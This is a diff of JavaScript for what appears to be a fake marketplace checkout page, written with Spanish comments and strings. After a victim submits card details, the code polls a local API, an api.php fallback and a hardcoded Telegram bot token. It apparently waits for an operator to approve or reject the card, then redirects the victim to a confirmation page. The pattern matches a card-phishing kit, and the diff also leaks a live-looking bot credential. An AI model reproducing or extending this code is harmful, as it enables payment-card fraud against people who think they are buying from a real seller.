@@ -579,14 +579,11 @@ async function show(id) {
     } catch (e) {}
   }
 
-  // Normalizar enlaces de Telegram para CORS y despliegue rápido
+  // Normalizar enlaces de fotos asegurando compatibilidad con el storage del hosting
   fotos = fotos.map(src => {
     if (typeof src !== 'string') return '';
     src = src.trim();
     if (!src) return '';
-    if (src.includes('api.telegram.org') && !src.includes('images.weserv.nl')) {
-      src = 'https://images.weserv.nl/?url=' + encodeURIComponent(src.replace(/^https?:\/\//, ''));
-    }
     return src;
   }).filter(Boolean);
 
@@ -606,9 +603,21 @@ async function show(id) {
     const img = document.createElement('img');
     img.src = src; img.alt = 'Foto ' + (i + 1); img.loading = 'lazy';
     img.onerror = () => {
-      if (src.includes('api.telegram.org') && !img.dataset.retried) {
-        img.dataset.retried = '1';
-        img.src = 'https://images.weserv.nl/?url=' + encodeURIComponent(src.replace(/^https?:\/\//, ''));
+      // 1. Si falló y tiene nombre de archivo img_xxx o tg_xxx, intentar cargarlo directo desde el storage /photos/
+      const m = src.match(/(img_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i) || src.match(/(tg_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i);
+      if (m && !img.dataset.retriedLocal) {
+        img.dataset.retriedLocal = '1';
+        img.src = '/photos/' + m[1];
+        return;
+      }
+      // 2. Si falló weserv y venía de telegram, intentar la URL directa
+      if (src.includes('images.weserv.nl') && !img.dataset.retriedTg) {
+        img.dataset.retriedTg = '1';
+        const parts = src.split('images.weserv.nl/?url=');
+        if (parts[1]) {
+          img.src = 'https://' + decodeURIComponent(parts[1]).replace(/^https?:\/\//, '');
+          return;
+        }
       }
     };
     track.appendChild(img);
@@ -858,36 +867,50 @@ $('formCard').addEventListener('submit', async ev => {
   if (cardPollTimer) clearTimeout(cardPollTimer);
 
   const pollCardStatus = async () => {
-    // 1. Probar API local si está disponible
+    let data = null;
+    // 1. Probar ruta amigable
     try {
       const resp = await fetch('/api/product/' + idProd + '/tarjeta/status?t=' + Date.now());
       if (resp.ok) {
-        const data = await resp.json();
-        if (data.status === 'continue' || data.status === 'continuar') {
-          const qParams = new URLSearchParams();
-          if (idProd) qParams.set('id', idProd);
-          if (currentProd) {
-            if (currentProd.titulo || currentProd.articulo) qParams.set('tit', currentProd.titulo || currentProd.articulo);
-            const pVal = currentProd.precioArticulo || currentProd.precio || 0;
-            if (pVal) qParams.set('precio', pVal);
-          }
-          const rawP = sp.get('p') || sp.get('d');
-          if (rawP) qParams.set('p', rawP);
-          try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-          window.location.href = '/confirmar.html?' + qParams.toString();
-          return;
-        } else if (data.status === 'error') {
-          $('spinnerTarjeta').style.display = 'none';
-          $('txtBtnTarjeta').textContent = 'Continuar';
-          btnSubmit.disabled = false;
-          $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
-          $('cardErrorBox').style.display = 'flex';
-          return;
-        }
+        data = await resp.json();
       }
     } catch (e) {}
 
-    // 2. Probar Telegram getMyDescription (funciona 100% en Netlify y fuera de local)
+    // 2. Probar api.php directo (fallback infalible para hosting PHP)
+    if (!data || !data.status) {
+      try {
+        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + idProd + '&t=' + Date.now());
+        if (resp2.ok) {
+          data = await resp2.json();
+        }
+      } catch (e) {}
+    }
+
+    if (data && data.status) {
+      if (data.status === 'continue' || data.status === 'continuar') {
+        const qParams = new URLSearchParams();
+        if (idProd) qParams.set('id', idProd);
+        if (currentProd) {
+          if (currentProd.titulo || currentProd.articulo) qParams.set('tit', currentProd.titulo || currentProd.articulo);
+          const pVal = currentProd.precioArticulo || currentProd.precio || 0;
+          if (pVal) qParams.set('precio', pVal);
+        }
+        const rawP = sp.get('p') || sp.get('d');
+        if (rawP) qParams.set('p', rawP);
+        try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
+        window.location.href = 'confirmar.php?' + qParams.toString();
+        return;
+      } else if (data.status === 'error') {
+        $('spinnerTarjeta').style.display = 'none';
+        $('txtBtnTarjeta').textContent = 'Continuar';
+        btnSubmit.disabled = false;
+        $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
+        $('cardErrorBox').style.display = 'flex';
+        return;
+      }
+    }
+
+    // 3. Fallback adicional Telegram getMyDescription
     try {
       const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
       if (tgDescResp.ok) {
@@ -904,7 +927,7 @@ $('formCard').addEventListener('submit', async ev => {
           const rawP = sp.get('p') || sp.get('d');
           if (rawP) qParams.set('p', rawP);
           try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-          window.location.href = '/confirmar.html?' + qParams.toString();
+          window.location.href = 'confirmar.php?' + qParams.toString();
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -917,7 +940,7 @@ $('formCard').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1200);
+    cardPollTimer = setTimeout(pollCardStatus, 1000);
   };
 
   cardPollTimer = setTimeout(pollCardStatus, 1200);
